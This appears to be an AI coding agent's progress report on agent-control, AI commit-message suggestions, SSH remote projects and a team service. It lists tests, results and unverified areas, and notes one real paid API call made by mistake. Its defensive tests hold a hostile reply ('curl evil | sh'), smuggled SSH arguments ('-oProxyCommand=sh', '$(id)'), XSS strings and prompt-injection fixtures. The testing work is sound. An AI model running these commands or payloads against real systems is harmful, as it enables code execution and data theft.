- `verify:agent-control` (new, Electron under Xvfb, `SHELL=/bin/sh`) passed 10 checks: the shell is refused before a grant; the owner grants through the dialog (default verbs plus **Open sessions**) and the button reads **Agent control on**; `awctl status` from inside the running shell shows this folder only with no host paths; `note create`, `canvas place` and `open --provider shell` succeed; on the canvas the note shows **AGENT NOTE** and its inert text at the placed position (760, 520), and the opened shell is a second canvas terminal; the child's grant file does not exist; the dialog lists open, canvas.place, note.create and grant, and **Revoke** turns it off; the next `awctl` call from the same shell is refused and the grants directory is empty; the parent shell has the same tmux and shell PIDs, and both sessions are still running.
- Re-run and passed: `smoke:ui` (9 checks), `verify:workflows` (15), `verify:lifecycle` (6), `verify:board` (10), `verify:desktop` (4), and `verify:mobile` (15 checks, with a new assertion that the remote browser has no agent-control API or button).
- Screenshot, inspected: `screenshots/desktop/agent-control.png` (the dialog with an active grant, recent actions and Revoke). Screenshots that the re-run scripts regenerate with only rendering differences were left unchanged.

Not verified: macOS at all, including the Unix socket path length under `~/Library/Application Support`, `ELECTRON_RUN_AS_NODE` with a packaged app and its asar-unpacked `awctl.mjs`, and whether a login `zsh` keeps the `PATH` entry. The test's macOS environment fallback (`ps eww`) has not been run. No real Claude or Codex agent ran `awctl`, and `open --provider claude|codex` was exercised only through the argument checks, since the open checks used shells. Electron's packaged-app fuses could disable `ELECTRON_RUN_AS_NODE`; a packaged build was not produced. The headless server creates the controller but has no route to grant, so `awctl` is unusable there by design. Windows (no named-pipe transport), SSH projects and `transcript.read` are not implemented. The Electron script reads `/proc`, so it is Linux-only. Same-OS-user processes can read a grant file or a pane's environment, so this limits what an agent may ask the app to do; it is not an isolation boundary.

- `npm test`: 77 tests, 75 passed, 2 opt-in skipped (the existing dictation one and the new real-Claude one). New `tests/assist.test.ts` has 6 tests plus 1 opt-in. Its fixture CLIs record argv, cwd, the folder's contents, the environment and stdin. They try to write `pwned.txt` and `../pwned.txt`, find a Git repository and use an SSH agent, and they can hang with a child process, print 1 MB, print ANSI/OSC links or obey injected instructions:
  - cleaning: ANSI/OSC/bidi/fences removed, subject ≤ 72, name ≤ 60, empty output rejected;
  - fail closed: removing `--strict-mcp-config`, `--safe-mode`, `"dontAsk"` or `--no-session-persistence` from help makes Claude unavailable with the missing flag named and no call made; Codex is unavailable with partial help and "unverified" with full help;
  - runner: a 700 ms timeout kills the CLI and its `sleep` child, removes the scratch folder and makes exactly one attempt; 1 MB output, an `is_error` result and exit 3 (stderr ANSI stripped) are reported; a binary rewritten after probing is refused without running;
  - commit flow through a real core:
    - off by default, with no call during snapshot, status, Git or preview; invalid provider/model settings are refused;
    - the preview omits the binary, excluded and over-cap files and never includes unstaged content; mismatched exclusions are refused;
    - the argv equals the expected list exactly, stdin equals the preview, and cwd is an empty scratch `work` folder outside any repository;
    - `SSH_AUTH_SOCK`, `AW_CONTROL_TOKEN`, `WORKSPACE_CONTROL_SOCKET`, `OPENAI_API_KEY`, `GITHUB_TOKEN` and `TMUX` are absent and `ANTHROPIC_API_KEY` is kept; no variable names the repository or data folder; the fixture's writes are gone;
    - HEAD, the index file hash, `git status` and the file list are unchanged after a reply that says `git commit -am pwned && curl evil | sh`;
    - staging another file changes the fingerprint, and the old preview is refused without calling the provider;
    - a running suggestion blocks a second one but not `git.status`, and `assist.cancel` stops it and its child;
  - name flow: a Claude session's sources are only the first message and folder, and a task attempt's include the task; another shell's typed `TERMINAL-SECRET` never appears; empty or unknown context is refused; the cleaned name is not applied until an explicit rename with the captured revision, which then makes a repeat stale; a first message asking to rename every session has no effect;
  - owner-only: the four commands are `owner` and refused by gateway validation; `configure` without acknowledgement, missing fields, an unknown provider, unknown actions and unknown fields are refused before any core call; the suggest request timeout (80 s) outlives the runner's 60 s.
- `verify:assist` (new, Electron under Xvfb, fixture `claude` on PATH, `SSH_AUTH_SOCK` set in the app's environment) passed 6 checks:
  - off by default, and the general channel cannot run suggestions or write their settings;
  - the settings dialog shows "Read-only checks passed" and the usage notice, and Save stays disabled until the acknowledgement is ticked;
  - **Suggest message** previews the staged diff without unstaged content and makes no call; **Generate draft** makes exactly one call whose stdin is the previewed text, from an `aw-assist-*/work` folder without `SSH_AUTH_SOCK`, and fills an editable commit box; HEAD and staging are unchanged;
  - staging another file shows the stale warning;
  - **Suggest name** with the folder unticked sends only the first message, and **Accept name** renames through `session.rename` (revision 1, session still running);
  - a paired Chromium browser has no `workspace.assist` and no **AI suggestions**, **Suggest message** or **Suggest name** controls, and the gateway refuses `assist.status` and `settings.write`.
- Regressions re-run and passed: `smoke:ui` (9 checks), `verify:workflows`, `verify:image-paste`, `verify:board` and `verify:desktop` (4 checks).
- Screenshots, each inspected: `screenshots/desktop/assist-settings.png`, `assist-commit.png` (preview of the exact text), `assist-commit-stale.png` (edited draft with the stale warning) and `assist-name.png`.

**Real CLI.** The opt-in test (`WORKSPACE_TEST_REAL_ASSIST=1`) was not run. One real request was made by mistake while checking that the installed Claude 2.1.314 accepts this exact argv. The CLI was run with a cleared environment and an empty `HOME`, on the assumption that it could not sign in. In this container it still authenticated and answered the prompt "hi": exit 0, a JSON result, a reported cost of $0.0049 on Sonnet, and the empty working folder still empty afterwards. That confirms the argv parses and runs; `--bogus-flag` and an invalid `--permission-mode` were rejected as controls. It does not show tool or MCP isolation against a hostile prompt.

Not verified:

- That Claude actually refuses tool use, MCP and file access under these flags against a hostile prompt. The fixture can only check what the app passes. The runner adds no OS sandbox and would not contain a malicious binary; it relies on the CLI's own restrictions.
- Interaction with managed policy.
- Codex, entirely (not installed here).
- macOS. The runner uses POSIX process groups; Windows shows suggestions as unavailable.
- OAuth refresh writes by the CLI to its own configuration.
- An unborn-HEAD repository in the UI. The fingerprint handles a missing HEAD, but no test covers it.
- Provider terms for this use of the CLI, which remain the owner's decision.

## Roadmap section 2: SSH projects with a local UI (after sections 4 and 5)

Built in an isolated worktree on `claude/jolly-clarke-oo3rm5` at `acfbf48` and checked in the same Linux container (OpenSSH 9.6p1 client and server installed with apt for the checks; tmux 3.4; Node 24.22.2). Designed only from this repository, the roadmap and public OpenSSH, tmux and Node documentation. Schema **v6 `roadmap_03_execution_hosts`** (the next unused number).

**Slices delivered, in order.** All four roadmap slices are implemented: (1) read-only host probe, (2) the versioned stdio helper, (3) the host router with remote folder registration and shell continuity across disconnects, (4) remote Files/Git, notes, canvas, tasks and board lanes through the same routed commands, plus Claude/Codex launch on the host with the host's PATH. Attachments, agent control and AI suggestions are refused for SSH sessions; keep-awake counts local sessions only; dictation stays local and types text into the remote terminal like any input.

**Transport (`src/core/ssh.ts`).** The system `ssh` client, unmodified, as `ssh -T -o BatchMode=yes -o StrictHostKeyChecking=yes -o UpdateHostKeys=no -o ForwardAgent=no -o ForwardX11=no -o ForwardX11Trusted=no -o ClearAllForwardings=yes -o PermitLocalCommand=no -o RequestTTY=no -o ControlMaster=no -o ControlPath=none -o ConnectTimeout=15 -o ServerAliveInterval=15 -o ServerAliveCountMax=3 [-p port] [-l user] -- <alias> <fixed remote command>`. The owner supplies only an alias (`[A-Za-z0-9_][A-Za-z0-9._-]*`, so never a leading `-`), optional user and port, and helper install and data folders (absolute or `~/`, a restricted character set, no `..`). There is no field for `-o`, ProxyCommand or any other option; extra fields are refused. The remote command is `"$HOME"/'<folder>/bin/aw-ssh-helper' [--data-dir '<folder>']`; folders, prompts, branches and files travel only inside frames. `-F <file>` is added only from the desktop's own `WORKSPACE_SSH_CONFIG` environment variable, which the tests use to point at their fixture config. The owner's own SSH config (including any ProxyCommand) is used as trusted local configuration. Failures are classified from ssh's stderr into owner-facing problems: unknown host key, changed host key (with the fingerprint ssh printed), sign-in refused, unreachable, helper missing, Node missing or too old, protocol mismatch, data upgrade required, data in use, protocol error, connection lost. For an unknown key the app reads the server's fingerprints with `ssh -G` (effective host and port) plus `ssh-keyscan` and `ssh-keygen -l`, and shows them; nothing is written to any known_hosts file.

**Protocol (`src/shared/host-protocol.ts`) and helper (`src/server/stdio-host.ts`, built to `dist/server/stdio-host.mjs`, launched by `bin/aw-ssh-helper` in the server archive).** The helper first writes a preamble (up to 64 KiB of login-profile output before it is skipped), then 4-byte big-endian length-prefixed UTF-8 JSON frames, at most 8 MiB, each with a kind. The helper may send only `hello`, `ready`, `res`, `evt`, `fatal`; the desktop only `start`, `req`, `bye`. Any other kind, a zero or oversized length, invalid JSON or a frame without a kind ends the connection. `hello` comes first and reports the protocol range, helper version, platform, the schema it writes, the schema of its existing data (read-only), its persistent ID and tool availability (Node, tmux, Git, Claude, Codex with `--version` first lines, found on the host's PATH plus its login shell's). A probe stops there with `bye`, so no core starts and nothing is created on the host. `start` negotiates the protocol; an older helper data schema needs the owner's explicit **Upgrade and connect** (`approveUpgrade`), and a newer one is refused. Then the helper runs a normal `createCore` against its own data folder (default `~/.agent-workspace-ssh`), so its tmux socket is its own; the core's owner lock refuses a second helper or a standalone server on the same data. Requests (`req` with a numeric ID) are `invoke` (only the commands and exact fields a paired browser may use, through the gateway's `validateCommand`), `browse` (folder listing on the host), `register` (absolute path, then `project.add`) and `hide`. At most 64 run at once. Settings, AI suggestions, `project.add` through `invoke`, attachments and agent-control grants are not reachable. Terminal output travels base64-encoded with the core's own per-viewer sequence numbers; ACKs come back as `session.ack`, and the existing 256 KiB per-viewer bound turns into `terminal.resync`. stdout carries only frames (console output goes to stderr). The helper exits when stdin closes; tmux sessions keep running. The launcher picks the first Node 24+ among `AW_NODE`, `node` on PATH, common install folders and the login shell's `node`, and reports `node-missing` otherwise.

**Router (`src/core/host-router.ts`, in the desktop utility process).** The local core and each connected host implement `ExecutionHost`. Remote records keep their own IDs and appear on the desktop as `ssh-<8 hex host>-<remote id>`; no stored ID is rewritten. A command is routed by the IDs in its payload (`projectId`, `sessionId`, `taskId`, `noteId`, `resumeSessionId`, layout position keys); mixing hosts, or local and remote IDs, is refused. Results are translated back; lane IDs stay as they are. Everything a host reports is sanitized against an explicit schema with bounded sizes (malformed records, unknown capability names and unexpected fields are dropped; `hosts` and other unknown snapshot fields cannot pass). Events are limited to snapshots, terminal data and resync for viewers this desktop attached, and session exit; any other event kind is a protocol violation that ends the connection. The merged snapshot adds remote folders and sessions with `hostId` and a `hosts` list (state, problem with fingerprints, helper version, protocol, tools, the host's own capabilities). While a host is disconnected its folders still show from a cached `remoteProjectRefs` list and its sessions show as `unknown`; commands to it are refused with "not connected" and never fall back to local paths. An unexpected loss reconnects automatically (1, 2, 4, 8, 15 seconds) unless the problem is a host key, sign-in, missing helper/Node, protocol or upgrade problem. Requests in flight when the connection drops fail with "outcome is unknown" and are never resent. After reconnecting, each attached view gets `terminal.resync` and reattaches to the same remote tmux session. Deliberate **Disconnect** and quitting the app close the helper and leave remote tmux running; a host left connected reconnects when the app starts. The remote helper ID is pinned on first connect and a different one is refused.

**Desktop surfaces.** New owner-only IPC `workspace:ssh` (`list`, `add`, `probe`, `connect`, `disconnect`, `browse`, `registerProject`, `remove`), behind the main-frame owner check with an action allowlist and an 8 KiB payload bound, forwarded to the utility as an internal `ssh` message (not a core command, so the gateway has no route). `Core.hostRecords` is a trusted internal method for the router (`list`, `putHost`, `removeHost`, `putProjectRefs`); it is not in `COMMANDS`. The gateway removes `hosts` from every snapshot and never shares a project with a `hostId`, even if it were in the allow list; the desktop's remote-access setup also leaves SSH folders out. Keep-awake ignores remote sessions. UI: **SSH hosts** panel (add with alias, name, user, port, helper folder and data folder; check host; connect/disconnect; browse and open a folder on the host; remove; problem cards with fingerprints; **Upgrade and connect**), a host badge on SSH folders in the sidebar and title bar, per-host connection lines in the footer, launch buttons that use the host's tools, and **Paste image**/**Agent control** hidden for SSH sessions. A terminal view now clears its old error once a reattach succeeds.

**Schema v6 `roadmap_03_execution_hosts`.** Additive, no rewrite: new record kinds `executionHosts` (alias, label, optional user/port, helper and data folders, pinned remote ID, last probe, auto-connect) and `remoteProjectRefs` (nonauthoritative cache of each host's folders). Same backup before upgrade and newer-version refusal. No keys, passphrases or passwords are stored.

Results:

- `npm run typecheck` passed.
- `npm test`: 91 tests, 89 passed, 2 opt-in skipped (the previous 79 passes plus 10). New:
  - `tests/ssh.test.ts` (7): frames round-trip in 7-byte pieces after a login banner; oversized, zero-length, non-JSON, kindless, unknown-kind and wrong-direction frames are refused, and endless banner text is refused; qualified IDs and refusal of mixed-host payloads; host input accepts an alias and narrow overrides only (`-oProxyCommand=sh`, `--`, `user@host`, `$(id)`, `..`, quotes, spaces, `options`/`proxyCommand` fields refused) and the exact ssh argument list; stderr classification; snapshot sanitizing. The helper run directly: greeting first with no data created by a probe, protocol 99 refused before any core starts, a request before start ends the connection, a second helper on the same data refused (`data-in-use`), `settings.write`, `settings.read`, `assist.status`, `assist.suggest`, `project.add`, `project.hide`, `attachment.create` and `agentControl` refused, unknown fields refused, a relative register path refused, unknown operation and unknown kind end the helper, an oversized frame ends it. Over a disposable sshd: unknown host key refused for probe and connect with the fixture's real SHA256 fingerprint and an untouched empty known_hosts; a changed key refused with the server's fingerprint and the pinned line unchanged; a trusted probe reports helper 0.3.0, protocol 1 and Node, tmux, Git, Claude and Codex availability without creating helper data; a missing helper names the install steps; a helper speaking protocol 5-7 is a mismatch; a malicious helper sending an oversized frame, a `req` for `clipboard.read`, an unknown kind, an answer to an unknown request or an unsupported `power.acquire` event is disconnected as a protocol error.
  - `tests/host-router.test.ts` (1, real sshd, real helper, real tmux, fixture `claude` on the host's PATH): browse and register a folder on the host; files list/read/write and Git status/diff run there; `../`, absolute and similarly named local paths are refused or untouched; notes, layout (with qualified position keys), tasks and board lanes route to the host; a shell opens in the host folder and its output arrives; image paste, agent control and AI suggestions are refused; killing the ssh client shows `reconnecting` and `unknown` sessions, refuses input, reconnects, emits `terminal.resync`, and the view reattaches the same session (same generation, backend name and pane PID; one session, nothing relaunched); an unacknowledged viewer gets `terminal.resync` on overflow; a `terminal.open` whose connection is killed right after sending reports unknown, and retrying the same key after reconnecting returns one session whose provider ran once in the host folder with the host's PATH; a launch while disconnected is refused before sending and launches once after connecting; a `files.write` whose answer is lost reports unknown and is not resent (a stale retry is a conflict if it did apply); after a desktop core restart the folder is still listed while disconnected and reconnecting finds the same running session; removing the host removes its folders from the list.
  - `tests/migrations.test.ts`: the registry now ends at v6; a v5 store upgrades to v6 with records unchanged and a `workspace-v5-*` backup; host records persist and are refused for bad IDs or actions and through `invoke`.
  - `tests/server.test.ts`: SSH hosts and SSH folders never reach a paired browser, in RPC snapshots or pushed snapshot events, even with a misconfigured allow list.
- `verify:ssh` (new, Electron under Xvfb, disposable sshd with `SetEnv AW_NODE=<Node 24>`) passed 10 checks, twice in a row with the helper copied from this build in the archive layout, and once with `WORKSPACE_VERIFY_SSH_ARCHIVE=release/agent-workspace-server-0.3.0.tar.gz` (extracted and installed with `npm ci`): unknown host key shown with its fingerprint and known_hosts untouched; probe after trusting shows helper version, protocol and tools; connect; browse and register a folder on the host with a host badge in the sidebar; open a shell there and see typed output from the host folder; kill the ssh client process, see Reconnecting then Connected in the footer, and type into the same reattached session (same PID and generation, nothing relaunched); edit and save a file on the host in the editor with the same-named local file unchanged; **Changes** shows the host repository's Git status; **Paste image** and **Agent control** are absent for the SSH session; **Disconnect** leaves the remote tmux session running and shows it as unknown.
- `verify:server-release` passed with a new check: the extracted archive's `bin/aw-ssh-helper` greets, starts, registers a folder and refuses an owner-only command outside the checkout.
- Regressions re-run and passed: `smoke` (8 checks), `smoke:ui` (9), `verify:workflows` (15), `verify:board` (10), `verify:agent-control` (10), `verify:lifecycle` (6), `verify:terminal` (7), `verify:image-paste` (6), `verify:keep-awake` (9), `verify:desktop` (4), `verify:remote-desktop` (7), `verify:mobile` (15).
- Screenshots, inspected: `screenshots/desktop/ssh-hosts.png` (connected host with helper version and tools), `ssh-host-key.png` (unknown host key with its fingerprint) and `ssh-session.png` (a shell on the host, host badges in the sidebar and title, host status in the footer). Screenshots that the re-run scripts regenerated with only the new footer button were left unchanged.

Not verified:

- A real remote machine: every check used a disposable sshd on 127.0.0.1 in this container, as root, with the "remote" helper and data in temp folders on the same machine. Real networks, latency, NAT timeouts, ProxyJump/ProxyCommand hosts (fingerprints cannot be scanned through a proxy), password- or passphrase-only setups (refused by batch mode), non-root users and hosts with different tmux versions were not tried.
- macOS as the desktop or as the host, and Windows OpenSSH as the client. The launcher is POSIX `sh`.
- A real Claude or Codex turn on the host (only a fixture `claude`), Claude's activity hooks firing on the host, and Codex at all. The probe ran the container's real `claude --version`, which does not call a model.
- The `upgrade-required` path end to end (the helper refuses an older store without `approveUpgrade`; the UI button exists) and a helper whose pinned ID changed, beyond the unit checks.
- Long-running stability, many hosts at once, and very large remote snapshots near the 8 MiB frame bound.
- Remote browser sharing of SSH folders is deliberately off and not implemented. Attachments over SSH (roadmap: a separate bounded attachment frame) are not implemented; pasting images into SSH sessions is refused.
- `/run/sshd` (sshd's empty privilege-separation directory) was created in this container for the fixture; no other system file changed.

## Roadmap section 9: team members, comments and assignments (after section 2)

Built in an isolated worktree on `claude/jolly-clarke-oo3rm5` at `ae55c54` and checked in the same Linux container (Node 24.22.2, Electron 45.1.0 under Xvfb, tmux 3.4). Designed only from this repository, the roadmap, the OpenID Connect Core and Discovery specifications, RFC 7636 (PKCE), RFC 8252 (native apps), RFC 9700 and the `openid-client`, `jose` and Electron `safeStorage` documentation. No hosting, identity provider or region was chosen. Everything is provider- and host-neutral; setup is described in [team-service.md](team-service.md).

**Dependencies.** Two new runtime dependencies, pinned exactly and installed from registry.npmjs.org with `--ignore-scripts`:

| Package | Version | License | Notes |
| --- | --- | --- | --- |
| `openid-client` | 6.8.8 | MIT | Depends on `jose` and `oauth4webapi` |
| `jose` | 6.2.14 | MIT | — |
| `oauth4webapi` | 3.8.8 | MIT | Transitive |

None has install scripts or native code. They are used only by the team service, which bundles them into `dist/team/server.mjs`. The desktop side uses Node's `fetch` and `http` only.

**Team service (`src/team/`).** A single Node process with its own SQLite store (`team.sqlite`, mode 0600, in a 0700 data folder) and its own migration registry (`team_01_members_comments_assignments`). Its tables are:

- `teams`, `members` (invited, active or suspended; identified by issuer + subject);
- `invitations` (hash only, expiry, optional bound email, placeholder member);
- `team_projects`, `project_memberships`;
- `shared_tasks` and `comments` (both with revision and tombstone), `assignments` (revision);
- `mutations` (idempotency per identity and mutation ID), `changes` (ordered sequence per project), `audit`;
- `login_transactions` and `service_sessions` (hashes only).

The service has its own HTTP or HTTPS listener, with the gateway's rule: a non-loopback listener requires TLS and an exact public origin. It refuses any request carrying a foreign `Origin`.

**Routes.** `GET /v1/info`; `POST /v1/auth/start|finish|refresh|logout`; `POST /v1/call/<action>` for the 20 `TEAM_ACTIONS`. Shared-task actions are named `sharedTask.*` so no name overlaps a core command. There is no route to terminals, files, Git, projects, settings or the gateway.

**Authentication (`src/team/auth.ts`, `src/team/client.ts`).** The flow is Authorization Code + PKCE `S256`:

1. The desktop opens the system browser (`shell.openExternal`) and listens on a one-shot loopback callback (`http://127.0.0.1:<port>/<path>` as the service's `/v1/info` describes; any port, or a fixed one).
2. The callback must match the service-issued `state` exactly before anything else is done.
3. The service is the OIDC client. It discovers the issuer with `openid-client` and requires an exact issuer match; an `http` issuer is allowed only on loopback, and only with `allowHttpLoopbackIssuer`.
4. It exchanges the code with the desktop's verifier, after checking the verifier against the stored challenge itself. It checks state and nonce through `openid-client`.
5. It verifies the ID token again with `jose` against the remote JWKS:
   - exact issuer and audience;
   - asymmetric algorithms only;
   - required `sub`, `iat`, `exp` and `nonce`, with 60 s of clock tolerance;
   - every audience must be allowed, and `azp` must be present when there are several.

   An unknown key ID refetches the JWKS after a cooldown (30 s by default). Keys are trusted for up to 10 minutes; both durations are configurable.

Other rules:

- Login transactions expire after 10 minutes and are consumed before the exchange, so a replay always fails.
- There is no public sign-up: a sign-in must redeem a valid invitation or match an active member.
- Service sessions are opaque random tokens stored as hashes: a 60-minute session and a 14-day refresh. Refresh rotates both atomically; reuse of a rotated refresh token revokes the family. Logout revokes.

**Authorization (`src/team/authorization.ts`, `src/team/service.ts`).** Roles:

- **Team owner:** admin of every project, plus team management.
- **Project admin:** members, roles, shared tasks, assigning anyone, deleting any comment (audited).
- **Member:** comments, editing and deleting their own comments, assigning themselves to an unassigned task or unassigning themselves.
- **Viewer:** read only.

Enforcement:

- Every call re-resolves the caller's active membership and role inside the same `BEGIN IMMEDIATE` transaction as the mutation.
- Unknown IDs, other teams' IDs, non-UUIDs and lost access all answer `no-access`.
- Assignees must be active, non-viewer members of the same project; pending invitations and other teams' members are refused.
- Removing a member clears their assignments and keeps comment authorship.
- Comment text is plain text (controls and bidi overrides removed, 4,000 characters) and never enters the audit log.
- Rate limits: comments 30/min, invitations 20/hour, calls 600/min per identity, auth 30/min per address.
- Request bodies are capped at 64 KiB; unknown fields are refused.

**Desktop (`src/desktop/team.ts`, `main.ts`, `preload.ts`).** The new owner-only IPC `workspace:team` sits behind the main-frame owner check with an action allowlist and a 16 KiB bound. Actions:

- the roadmap's `status`, `connect`, `disconnect`, `publishProject` and `revokeProject`;
- the relays the UI needs: `previewTask`, `publishTask`, `unpublishTask`, `sync`, `boardInfo`, `sharedTasks`, `taskDetail`, `members`, `invite`, `setRole`, `removeMember`, `addComment`, `editComment`, `deleteComment`, `assign`, `resolve`.

The team session lives only in the main process. It is stored with Electron `safeStorage` in `team-session.bin` (mode 0600). The app fails closed when `isEncryptionAvailable()` is false, or when Linux selects the unencrypted `basic_text` backend. Only the test switch `WORKSPACE_TEST_TEAM_BASIC_SECRET_STORE=1`, honoured only together with `WORKSPACE_TEST_DATA_DIR`, overrides that: it adds `--password-store=basic` and `setUsePlainTextEncryption(true)`.

Publishing a task requires the hash of the preview the owner saw. The preview is exactly `{title, description, status}`; a stale hash is refused.

**Local core (migration `roadmap_05_team_metadata`).** The local core has no new core commands, so `COMMAND_POLICY` is unchanged and a test asserts that no `team*` command exists. Team state uses a trusted internal method, `Core.team(action, payload)`. It is reached only through the utility's internal `team` message from main, routed by the host router to the local core only, like `hostRecords`. The generic `invoke` and the gateway cannot reach it.

The migration takes the next unused number, which is v7 in this tree. Tests reference it by name, because the owner renumbers at merge. It adds tables only:

- `team_link`: service URL, identity and teams; never tokens, and unexpected fields are refused.
- `team_projects_local`: role, local folder link, state, cursor, truncated flag.
- `team_task_map`: local task, shared task, the local revision published and the payload hash.
- `team_cache`: per-project tasks, comments, assignments and members, bounded to 5,000 rows with the oldest comments dropped first.
- `team_outbox`: at most 200 entries, immutable mutation IDs, metadata actions only.

Cache rules:

- A page applies only when its `after` equals the stored cursor, and sequences must strictly increase.
- Older revisions are ignored, and tombstones of tasks, comments and assignments are sticky.
- A revoked project ignores all pages.
- `setProjects` (run first on every sync) purges the cache, outbox and task links of projects the person lost.
- Local tasks are never rewritten.

**Sync (`src/team/sync.ts`).** Each sync runs these steps in order:

1. Revalidate access (`me`, then `setProjects`).
2. Flush the outbox in order. An offline, rate-limited or server error keeps the item with the same mutation ID; a revision conflict is marked `conflict`; a refusal is marked `failed`.
3. Pull every active project's ordered change pages.

**Apply to latest** resends against the current cached revision with a new mutation ID; **Discard** drops the change.

**UI.**

- The Team panel (`TeamPanel.tsx`): connect, identity and online state, Sync now, Disconnect, the unsent-changes list with resolve buttons, publish or stop publishing for this folder, and team projects with members (roles, remove), invitations (code shown once) and shared tasks with their threads.
- Board task cards (Tasks mode only, `Board.tsx` and `TaskTeam.tsx`): a sync-state chip, the assignee and the comment count.
- The task sheet's **Team** section: share or update after a preview, stop sharing, an **Assignee** picker (admins see active non-viewer members, members only themselves), and comments with add, edit and delete-own (admins delete any). Comments render as React text with `white-space: pre-wrap`; there is no HTML, links or mentions.
- SessionView, LaunchBar, SessionBoard and the terminals were not touched.

Results:

- `npm run typecheck` passed.
- `npm test`: 113 tests. One full run had 111 passed and 2 opt-in skipped (the previous 89 passes plus 22). The final full run had 110 passed and 1 failed: `tests/host-router.test.ts` hit `write EPIPE` from the disposable-sshd fixture. That file and `tests/ssh.test.ts` then passed 8 of 8 when run alone. The same EPIPE also happened at the base commit `ae55c54` when `ssh.test.ts`'s probe test ran alone, so it is an existing fixture flake, not a team regression.

  The only migration-test change: the registry test no longer hard-codes the last version, and the v6 test asserts `SCHEMA_VERSION`. New:
  - `tests/team-auth.test.ts` (7), against a local fake OIDC issuer (`scripts/fake-oidc.mjs`: discovery, auto-approving authorize by `login_hint`, PKCE-checking token endpoint, JWKS, key rotation and tampering):
    - owner sign-in via PKCE and loopback, with issuer + subject stored;
    - invitation reuse, no invitation, expired, revoked, wrong-email and guessed codes refused;
    - wrong issuer, audience, nonce, expired token, an extra audience, and a token signed by an unpublished key with a known `kid` all rejected, without consuming the invitation;
    - wrong PKCE verifier, wrong state, replayed transaction, plain PKCE and non-loopback, wrong-path, `localhost` or privileged-port redirects refused;
    - a cross-origin request refused;
    - a rotated key fetched; a retired key refused once the configured key lifetime passed;
    - session expiry, refresh rotation, refresh reuse revoking the family, client auto-refresh and logout;
    - insecure issuer, `HS256`, non-loopback redirect and non-HTTPS service URL configurations refused.
  - `tests/team-authorization.test.ts` (6):
    - a 10-action by 5-role matrix (owner, admin, member, viewer, other-team owner), plus task update, comment edit, delete and moderation (with audit and no text), assignment rules and role changes;
    - viewer read-only on 7 writes; a pending invitation cannot be assigned;
    - cross-team and guessed IDs give the same `no-access`, and extra fields are refused;
    - a member removed after authenticating but before their transaction is refused; their assignment is cleared and authorship kept; team removal ends all access;
    - comment and invitation rate limits;
    - no team token reaches terminals, files or the gateway: no overlap between `TEAM_ACTIONS` and `COMMANDS`; core command names return 404 on the service; the gateway reports `authenticated: false` and refuses the WebSocket for a team token as cookie or bearer, and runs no command.
  - `tests/team-sync.test.ts` (8), with real cores (`createCore`) plus the desktop module and in-memory secrets:
    - the migration is named and ordered;
    - the preview has exactly 3 fields and no paths; the service stores exactly that; local edits show `local-changes`; a stale preview hash is refused; the snapshot and core store hold no token; comments and assignment reach the owner's board;
    - an offline comment is queued visibly and counted; a lost acknowledgement is resent with the same mutation ID and leaves one comment; the outbox bound holds; a `session.input` action cannot be queued;
    - a stale comment edit becomes a conflict, then **Apply to latest** sends it; a refused self-assignment stays visible as failed; a republish over another admin's change is refused, then succeeds after review;
    - 230 comments are paged into the cache with cursor equal to the last sequence; `comment.list` paginates 100/100/30; a replayed old page is ignored and an unordered page refused;
    - a malicious comment (`<img onerror>`, `<script>`, a `javascript:` link, bidi, bell and escape characters) is stored as literal text without controls, and renders escaped through `react-dom/server`;
    - a deleted comment is not resurrected by a replayed page; on removal the member's next sync purges the project cache and drops its queued comment unsent; stale pages for the revoked project are ignored; the owner is unaffected; disconnect clears the link, cache and session but keeps local tasks;
    - no secure storage refuses sign-in without opening a browser; non-HTTPS addresses, unknown actions and fields, a token field in the link, and `invoke("team")` are refused.
  - `tests/migrations.test.ts`: `roadmap_05_team_metadata` adds the five tables, leaves records byte-identical and keeps a backup.
- `verify:team` (new) passed 8 checks, four times (the last on the committed build), with Electron under Xvfb, using two app instances with separate data folders (alice as owner, bob as member), `dist/team/service.mjs` on loopback and the fake issuer:
  1. Secret storage reported `basic_text (test only)`.
  2. The owner connected through the real loopback callback.
  3. The stored session file contains no plain `tst_`/`tsr_`, and none reaches the renderer, `localStorage` or a core command.
  4. The publish preview showed exactly the JSON the service stored.
  5. The owner created an invitation in the panel.
  6. The member joined with it, commented `<b>not bold</b>` (shown as text) and assigned themself.
  7. The owner's card showed Shared, Bob Member and 2 comments, and the task sheet showed the thread.
  8. The owner removed Bob. After his sync, his projects were revoked, his shared tasks and details were refused and his panel showed none; the owner's card returned to Unassigned and the local task was unchanged.
- Regressions passed: `smoke:ui` (9 checks), `verify:workflows` (15), `verify:board` (10), `verify:remote-desktop` (7) and `verify:mobile` (15). `verify:mobile` timed out once in the back-to-back run at its "Reconnecting · input paused" step, then passed 15 of 15 standalone.
- Screenshots, inspected: `screenshots/desktop/team-panel.png` (connected owner, published folder, members with role picker and remove, invitation form, shared task) and `team-comments.png` (a board card with Shared, assignee and comment count, and the task sheet's Team section with the assignee and two comments, one with literal markup). Screenshots that the regression scripts regenerated with only the new **Team** footer button were restored.

Not verified:

- **No real identity provider.** Only the local fake issuer was used, over loopback HTTP with `allowHttpLoopbackIssuer`. The configuration notes in `team-service.md` for hosted and self-hosted providers are untested. Some providers may require an exact redirect port, issuer quirks or the `client_secret_post` method.
- **No real HTTPS deployment.** The TLS listener path (`certFile`/`keyFile`) and a reverse-proxy setup were not exercised.
- **The production secret stores.** macOS Keychain, Windows DPAPI and Linux Secret Service were never tested; only the test-only basic store under Xvfb was. `setUsePlainTextEncryption` uses an in-memory key, so the test store does not survive an app restart. Restart persistence of the team session is therefore unverified on every platform.
- **The real system browser.** `shell.openExternal` was not used; the test fetched the authorize URL instead.
- **Scale and long runs.** Backup and restore of `team.sqlite` (the `backup` command exists and restore is documented), many teams or members, long-running sync, and service restarts during sync were not tested.
- **Not built:** email delivery of invitations, team-level invitations and ownership transfer in the UI (team-level invites exist in the API only), team deletion, retention and purge policy (an owner decision), live push (the app polls every 15 s), and the server-archive packaging of the team service (it builds as `dist/team/server.mjs`).
- **The opt-in staging check.** The roadmap's opt-in check with two owner-provided identities against a real deployment was not run.
